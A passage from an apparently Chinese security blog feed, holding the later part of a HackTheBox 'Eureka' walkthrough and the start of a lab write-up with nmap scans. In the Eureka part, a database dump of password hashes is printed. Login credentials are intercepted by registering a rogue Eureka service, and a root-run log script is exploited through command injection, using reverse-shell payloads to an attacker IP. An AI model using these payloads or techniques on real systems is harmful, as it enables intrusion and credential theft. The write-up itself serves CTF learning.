| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  
| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |
| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |
```

```bash
MariaDB [Furni_WebApp_DB]> select * from users;
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
| id | first_name | last_name | email                   | password                                                     | is_staff |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10$J4yap5ZxviliZO9jBCuSdeD.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |
|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10$DgUDWpxipW2Yt7UcKxzvweB7FXoV/LFxlJG8yuL56NyUMMLr5uBuK |        0 |
|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10$3LDYl5QEt4K4u8vLWMGH8eDA/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |
|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10$4TLCSlEfYrNDFfPDQ5z4p.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |
|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |
| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |
| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |
| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10$J93xmU0.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |
| 15 | test       | test      | test@test.com           | $2a$10$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR.toEjh63rbQWG |        0 |
+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+
9 rows in set (0.000 sec)
```

å°†å¯†ç æ”¾åå°è¿›è¡Œçˆ†ç ´

ç„¶åä¸Šä¼  `pspy64` ç›‘æµ‹ä¸€ä¸‹åå°ï¼Œå‘ç° `/opt/log_analyse.sh` å’Œ `/opt/scripts/miranda-Login-Simulator.sh` ä¸¤ä¸ªè„šæœ¬ï¼Œç¬¬äºŒä¸ªè„šæœ¬åº”è¯¥æ˜¯æ¨¡æ‹Ÿ`miranda`ç”¨æˆ·ç™»å½•Webç„¶ååœ¨æ•°æ®åº“ä¸­ç•™ä¸‹`SESSION`

```bash
2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       
2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       
2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           
2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac
he-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t
mp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         
2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  
2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  
```

é‚£ä¹ˆå°±æ˜¯è¯´åœ¨ä¸€å®šæ—¶é—´ä¼šè¿è¡Œè¯¥è„šæœ¬ï¼Œå¹¶ä¸”æºå¸¦`miranda`çš„è´¦æˆ·å¯†ç å»è¿›è¡Œç™»å½•ã€‚

ç°åœ¨æˆ‘ä»¬åº”è¯¥å»é€šè¿‡æŸç§æ–¹å¼å»è·å¾—æ•°æ®åŒ…

### Spring Eureka æˆªå–æµé‡

ä½¬ä»¬åˆ†äº«äº†ä¸€ç¯‡æ–‡ç« ï¼šhttps://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539

å…¶ä¸­å°±æœ‰å…³äº**æµé‡åŠ«æŒ**çš„ï¼Œå¤§è‡´å°±æ˜¯ï¼šæ”»å‡»è€…å°†æ³¨å†ŒÂ ***webservice***Â å®ä¾‹å¹¶å°†å…¶æŒ‡å‘æ¶æ„æœåŠ¡å™¨ï¼Œæˆ–è€…æ›¿æ¢æ‰åŸæœ¬çš„å®ä¾‹ï¼Œåœ¨é¶æœºä¸­å¯èƒ½æ˜¯ **USER-MANAGEMENT-SERVICE**

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image5.png)

ä» `heapdump` ä¸­å¯¼å‡ºçš„æ•°æ®ä¸­

```bash
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
```

å¯ä»¥çŸ¥é“ Eureka Clientï¼Œé»˜è®¤è¦è¿æ¥çš„ Eureka Server åœ°å€æ˜¯ `http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`ï¼Œè€Œä¸”è®¿é—®æ—¶è¦ç”¨è´¦å·å¯†ç è®¤è¯ã€‚

éœ€è¦ä½¿ç”¨æœ¬åœ°åœ°å€è¿›è¡Œè®¿é—®ï¼Œé‚£ä¹ˆå°±è¦ç”¨ `SSH` å°†ç«¯å£è½¬å‘å‡ºæ¥

```bash
ssh -L 8761:localhost:8761 oscar190@10.10.11.66
```

`kali`ç›‘å¬ç«¯å£

```bash
âœ  Eureka nc -lvp 8081
listening on [any] 8081 ...
```

ç„¶åæŸ¥çœ‹ `/eureka/apps/USER-MANAGEMENT-SERVICE` åŸæœ¬çš„å†…å®¹

```bash
âœ  Eureka curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H "Accept: application/json"
```

```bash
{
  "application": {
    "name": "USER-MANAGEMENT-SERVICE",
    "instance": [
      {
        "instanceId": "192.168.40.130:user-management-service:6969",
        "hostName": "192.168.40.130",
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "192.168.40.130",
        "status": "UP",
        "overriddenStatus": "UNKNOWN",
        "port": {
          "$": 6969,
          "@enabled": "true"
        },
        "securePort": {
          "$": 9443,
          "@enabled": "false"
        },
        "countryId": 1,
        "dataCenterInfo": {
          "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
          "name": "MyOwn"
        },
        "leaseInfo": {
          "renewalIntervalInSecs": 30,
          "durationInSecs": 90,
          "registrationTimestamp": 1745749189827,
          "lastRenewalTimestamp": 1745749189827,
          "evictionTimestamp": 0,
          "serviceUpTimestamp": 1745749189827
        },
        "metadata": {
          "zone": "default",
          "management.port": "6969"
        },
        "homePageUrl": "http://192.168.40.130:6969/",
        "statusPageUrl": "http://192.168.40.130:6969/info",
        "healthCheckUrl": "http://192.168.40.130:6969/health",
        "secureHealthCheckUrl": "",
        "vipAddress": "user-management-service",
        "secureVipAddress": "user-management-service",
        "isCoordinatingDiscoveryServer": "false",
        "lastUpdatedTimestamp": "1745749189827",
        "lastDirtyTimestamp": "1745750384661",
        "actionType": "ADDED"
      },
      {
        "instanceId": "localhost:USER-MANAGEMENT-SERVICE:8081",
        "hostName": "localhost",
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "10.10.11.66",
        "status": "UP",
        "overriddenStatus": "UNKNOWN",
        "port": {
          "$": 8081,
          "@enabled": "true"
        },
        "securePort": {
          "$": 443,
          "@enabled": "false"
        },
        "countryId": 1,
        "dataCenterInfo": {
          "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
          "name": "MyOwn"
        },
        "leaseInfo": {
          "renewalIntervalInSecs": 30,
          "durationInSecs": 90,
          "registrationTimestamp": 1745747961808,
          "lastRenewalTimestamp": 1745755807954,
          "evictionTimestamp": 0,
          "serviceUpTimestamp": 1745747961808
        },
        "metadata": {
          "management.port": "8081"
        },
        "homePageUrl": "http://localhost:8081/",
        "statusPageUrl": "http://localhost:8081/actuator/info",
        "healthCheckUrl": "http://localhost:8081/actuator/health",
        "vipAddress": "USER-MANAGEMENT-SERVICE",
        "secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "isCoordinatingDiscoveryServer": "false",
        "lastUpdatedTimestamp": "1745747961808",
        "lastDirtyTimestamp": "1745747961026",
        "actionType": "ADDED"
      }
    ]
  }
}

```

æ„é€ æ¶æ„æ•°æ®åŒ…ï¼Œä¸éœ€è¦å…¨éƒ¨éƒ½æ·»åŠ ï¼Œæ…¢æ…¢æµ‹è¯•å³å¯

```bash
curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H 'Content-Type: application/json' -d '{
  "instance": {
	  "hostName": "10.10.16.59",
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.16.59",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    },
    "status": "UP",
    "port": {
      "$": 8081,
      "@enabled": "true"
    }
  }
}'
```

ç„¶åæˆ‘ä»¬çš„ç«¯å£å°±ä¼šæ•è·åˆ°æ•°æ®åŒ…

```bash
âœ  Eureka nc -lvp 8081
listening on [any] 8081 ...
connect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:45412"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.16.59:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk
```

å¾—åˆ° `miranda` çš„è´¦å·å¯†ç 

```bash
username=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve
```

`SSH` ç™»å½•

```bash
âœ  Eureka ssh miranda-wise@10.10.11.66
miranda-wise@10.10.11.66's password: 
Last login: Sun Apr 27 12:40:29 2025 from 10.10.16.59
miranda-wise@eureka:~$ 
```

æ‹¿åˆ° user.txt

```
cat user.txt
1c0182b3b229fff1f28a469053a94c36
```

## ææƒ

### ä¿¡æ¯æ”¶é›†

ä½¿ç”¨äº† Linpeas.sh è¿›è¡Œæ”¶é›†åï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯

```bash
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Basic information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                               â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
OS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025
User & Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)
Hostname: eureka
```

### è„šæœ¬åˆ†æ

åˆå›åˆ°ä¹‹å‰çš„è„šæœ¬å¤„ï¼Œæƒ³èµ·æ¥ä½¿ç”¨ `pspy64` è¿›è¡Œæ£€æµ‹çš„æ—¶å€™è¿˜æœ‰å¦å¤–ä¸€ä¸ªè„šæœ¬

```bash
2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log 
```

æ˜¯ä»¥ `root` èº«ä»½è¿è¡Œçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯¹ `/var/www/web/user-management-service` ç›®å½•æœ‰åˆ é™¤çš„æƒé™ï¼Œä½†æ˜¯å¯¹ `application.log` æ²¡æœ‰å†™çš„æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ é™¤äº†æ—¥å¿—æ–‡ä»¶åå†åˆ›å»ºä¸€ä¸ªï¼Œæˆ‘ä»¬å°±æœ‰å†™æƒé™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦æ‰¾åˆ°è„šæœ¬ä¸­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting GROUP writable files (not in Home) (max 200)
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group developers:
/var/www/web    
/var/www/web/user-management-service
/var/www/web/user-management-service/target 
```

åˆ†æè„šæœ¬ï¼ˆå–‚ç»™ `GPT`ï¼‰

```bash
#!/bin/bash

# é¢œè‰²å®šä¹‰ï¼Œç”¨äºè¾“å‡ºå½©è‰²ä¿¡æ¯
GREEN='\033[0;32m'      # ç»¿è‰²ï¼Œç”¨äºæˆåŠŸæ¶ˆæ¯
RED='\033[0;31m'        # çº¢è‰²ï¼Œç”¨äºé”™è¯¯æ¶ˆæ¯
YELLOW='\033[1;33m'     # é»„è‰²ï¼Œç”¨äºè­¦å‘Šæ¶ˆæ¯
BLUE='\033[0;34m'       # è“è‰²ï¼Œç”¨äºä¿¡æ¯æ¶ˆæ¯
CYAN='\033[0;36m'       # é’è‰²ï¼Œç”¨äºä¸€èˆ¬ä¿¡æ¯
RESET='\033[0m'         # é‡ç½®é¢œè‰²ï¼Œæ¢å¤é»˜è®¤é¢œè‰²

# å®šä¹‰æ—¥å¿—æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶
LOG_FILE="$1"           # ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„
OUTPUT_FILE="log_analysis.txt"  # è¾“å‡ºæ–‡ä»¶ï¼Œä¿å­˜åˆ†æç»“æœ

# å£°æ˜å…³è”æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ç™»å½•è®¡æ•°
declare -A successful_users  # å…³è”æ•°ç»„ï¼Œå­˜å‚¨æˆåŠŸç™»å½•çš„ç”¨æˆ·åŠå…¶æ¬¡æ•°ï¼šç”¨æˆ·å -> æ¬¡æ•°
declare -A failed_users      # å…³è”æ•°ç»„ï¼Œå­˜å‚¨å¤±è´¥ç™»å½•çš„ç”¨æˆ·åŠå…¶æ¬¡æ•°ï¼šç”¨æˆ·å -> æ¬¡æ•°

# å®šä¹‰åˆå§‹çš„ HTTP çŠ¶æ€ç åŠå…¶è®¡æ•°ï¼ˆåˆå§‹åŒ–ä¸º 0ï¼‰
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0")

# æ£€æŸ¥æ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨
if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"  # å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯
    exit 1  # è„šæœ¬é€€å‡ºå¹¶è¿”å›é”™è¯¯ç 
fi

# åˆ†æç™»å½•æˆåŠŸå’Œå¤±è´¥çš„å‡½æ•°
analyze_logins() {
    # å¤„ç†æˆåŠŸç™»å½•çš„è®°å½•
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å
        # å¦‚æœç”¨æˆ·å·²ç»å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œåˆ™å¢åŠ è¯¥ç”¨æˆ·çš„ç™»å½•è®¡æ•°
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1  # ç¬¬ä¸€æ¬¡ç™»å½•ï¼Œåˆå§‹åŒ–è®¡æ•°ä¸º 1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")  # è¿‡æ»¤å‡ºåŒ…å« 'LoginSuccessLogger' çš„è¡Œ

    # å¤„ç†å¤±è´¥ç™»å½•çš„è®°å½•
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å
        # å¦‚æœç”¨æˆ·å·²ç»å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œåˆ™å¢åŠ è¯¥ç”¨æˆ·çš„å¤±è´¥ç™»å½•è®¡æ•°
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1  # ç¬¬ä¸€æ¬¡å¤±è´¥ï¼Œåˆå§‹åŒ–è®¡æ•°ä¸º 1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")  # è¿‡æ»¤å‡ºåŒ…å« 'LoginFailureLogger' çš„è¡Œ
}

# åˆ†ææ—¥å¿—ä¸­çš„ HTTP çŠ¶æ€ç 
analyze_http_statuses() {
    # å¤„ç†æ¯ä¸€è¡Œæ—¥å¿—ï¼ŒæŸ¥æ‰¾çŠ¶æ€ç 
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')  # æå–çŠ¶æ€ç 
        found=0
        # éå† STATUS_CODES æ•°ç»„ï¼Œæ£€æŸ¥çŠ¶æ€ç æ˜¯å¦å­˜åœ¨
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)  # è·å–çŠ¶æ€ç 
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)  # è·å–å½“å‰è®¡æ•°
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))  # å¦‚æœçŠ¶æ€ç å­˜åœ¨ï¼Œå¢åŠ è®¡æ•°
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")  # è¿‡æ»¤å‡ºåŒ…å« 'Status: ' çš„è¡Œ
}

# åˆ†ææ—¥å¿—ä¸­çš„é”™è¯¯ä¿¡æ¯
analyze_log_errors(){
    # è¾“å‡ºæ—¥å¿—çº§åˆ«çš„ç»Ÿè®¡ä¿¡æ¯
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)  # æå–æ—¥å¿—çº§åˆ«å¹¶æ’åºç»Ÿè®¡
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;       # INFOçº§åˆ«ä½¿ç”¨è“è‰²
        else if ($2 == "WARN") color=yellow; # WARNçº§åˆ«ä½¿ç”¨é»„è‰²
        else if ($2 == "ERROR") color=red;  # ERRORçº§åˆ«ä½¿ç”¨çº¢è‰²
        else color=reset;                   # å…¶ä»–æ—¥å¿—çº§åˆ«æ¢å¤é»˜è®¤é¢œè‰²
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # è¾“å‡ºæ‰€æœ‰çš„é”™è¯¯æ¶ˆæ¯
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka æœåŠ¡è¿æ¥å¤±è´¥çš„é”™è¯¯
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)  # ç»Ÿè®¡ Eureka é”™è¯¯çš„æ•°é‡
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"  # è¾“å‡º Eureka é”™è¯¯çš„æ•°é‡
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'  # è¾“å‡ºæœ€æ–°çš„ Eureka é”™è¯¯
}

# æ˜¾ç¤ºæœ€ç»ˆçš„åˆ†æç»“æœ
display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # è¾“å‡ºæˆåŠŸç™»å½•ç»Ÿè®¡ä¿¡æ¯
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"  # æ˜¾ç¤ºæ¯ä¸ªç”¨æˆ·çš„æˆåŠŸç™»å½•æ¬¡æ•°
        total_success=$((total_success + count))  # ç´¯åŠ æˆåŠŸç™»å½•æ€»æ•°
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"  # æ˜¾ç¤ºæˆåŠŸç™»å½•æ€»æ•°

    # è¾“å‡ºå¤±è´¥ç™»å½•ç»Ÿè®¡ä¿¡æ¯
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"  # æ˜¾ç¤ºæ¯ä¸ªç”¨æˆ·çš„å¤±è´¥ç™»å½•æ¬¡æ•°
        total_failed=$((total_failed + count))  # ç´¯åŠ å¤±è´¥ç™»å½•æ€»æ•°
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"  # æ˜¾ç¤ºå¤±è´¥ç™»å½•æ€»æ•°

    # è¾“å‡º HTTP çŠ¶æ€ç åˆ†å¸ƒ
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # æŒ‰çŠ¶æ€ç è¿›è¡Œæ’åº
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)  # è·å–çŠ¶æ€ç 
        count=$(echo "$entry" | cut -d':' -f2)  # è·å–è¯¥çŠ¶æ€ç çš„è®¡æ•°
        total_requests=$((total_requests + count))  # ç´¯åŠ  HTTP è¯·æ±‚æ€»æ•°
        
        # æ ¹æ®çŠ¶æ€ç çš„ç±»å‹é€‰æ‹©é¢œè‰²
        if [[ $code =~ ^2 ]]; then color="$GREEN"   # 2xx çŠ¶æ€ç ä½¿ç”¨ç»¿è‰²
        elif [[ $code =~ ^3 ]]; then color="$YELLOW" # 3xx çŠ¶æ€ç ä½¿ç”¨é»„è‰²
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"  # 4xx å’Œ 5xx çŠ¶æ€ç ä½¿ç”¨çº¢è‰²
        else color="$CYAN"  # å…¶ä»–çŠ¶æ€ç ä½¿ç”¨é’è‰²
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"  # æ˜¾ç¤ºæ¯ä¸ªçŠ¶æ€ç åŠå…¶è®¡æ•°
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"  # æ˜¾ç¤º HTTP è¯·æ±‚æ€»æ•°
}

# ä¸»æ‰§è¡Œè¿‡ç¨‹
analyze_logins  # è°ƒç”¨åˆ†æç™»å½•å‡½æ•°
analyze_http_statuses  # è°ƒç”¨åˆ†æ HTTP çŠ¶æ€ç å‡½æ•°
display_results | tee "$OUTPUT_FILE"  # æ˜¾ç¤ºç»“æœå¹¶ä¿å­˜åˆ°è¾“å‡ºæ–‡ä»¶
analyze_log_errors | tee -a "$OUTPUT_FILE"  # åˆ†ææ—¥å¿—é”™è¯¯å¹¶è¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"  # è¾“å‡ºåˆ†æå®Œæˆæ¶ˆæ¯
```

ç„¶åå‘ç°ä¸€äº›å¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„åœ°æ–¹

```bash
username=$(echo "$line" | awk -F"'" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å
code=$(echo "$line" | grep -oP 'Status: \K.*')
```

å¯¹è¿™é‡Œè¿›è¡Œæµ‹è¯•

```bash
âœ  Eureka echo "$(echo 1 >> 1.txt)" | grep -oP 'Status: \K.*'

âœ  Eureka cat 1.txt

1
```

### å‘½ä»¤æ³¨å…¥

åœ¨é¶æœºä¸Šæµ‹è¯•

```bash
rm -r /var/www/web/user-management-service/log/application.log
echo "Status: $(echo 1 >> /home/miranda-wise/1.txt)" > /var/www/web/user-management-service/log/application.log
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image6.png)

æˆåŠŸï¼Œè¿›è¡Œåå¼¹ `shell`

```bash
echo "Status: $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.59/1234 0>&1')" > /var/www/web/user-management-service/log/application.log
```

ä½†æ˜¯ç›´æ¥æ³¨å…¥ä¼šä»¥å½“å‰ç”¨æˆ·æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œæ”¹é€ 

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image7.png)

è¿™æ ·å°±ä¸ä¼šç›´æ¥æ‰§è¡Œï¼Œè€Œæ˜¯å…ˆå†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­

```bash
echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.59/1234 0>&1)]' > /var/www/web/user-management-service/log/application.log
```

![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image8.png)

è¯»å– `root.txt`

```bash
cat root.txt
2a29dd1a4d1172b24ca76dd452035829
```

## æ€»ç»“

ä¿¡æ¯æ”¶é›†æ˜¯çœŸçš„å¾ˆé‡è¦ï¼Œå¯¹æ”¶é›†åˆ°ä¿¡æ¯å»ä»”ç»†åˆ†æï¼Œæ€»æ˜¯ä¼šæ‰¾åˆ°æœ‰ç”¨çš„ã€‚
]]></content:encoded>
            <category>é¶æœº</category>
            <category>Linuxé¶æœº</category>
            <category>HackTheBox</category>
            <category>Spring</category>
            <category>Eureka</category>
            <category>å‘½ä»¤æ³¨å…¥</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab4]]></title>
            <link>https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4</guid>
            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab4 https://www.cyberstrikelab.com/#/scene/detail/23 Recon å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ 5820 æ˜¯ WebæœåŠ¡ 192.168.10.10 BlueCMS æ­å»ºç€çš„æ˜¯ BlueCMS åœ¨é¡µè„šä¸­èƒ½æ‰¾åˆ°æ˜¯ï¼šPowered by BlueCMS v1....]]></description>
            <content:encoded><![CDATA[
# Lab4

> https://www.cyberstrikelab.com/#/scene/detail/23
> 

## Recon

å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ

```php
âœ  Lab4 nmap -sT -min-rate 5000 -p- 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:31 CST
Nmap scan report for 192.168.10.10
Host is up (0.051s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5820/tcp  open  autopassdaemon
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

```php
âœ  Lab4 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
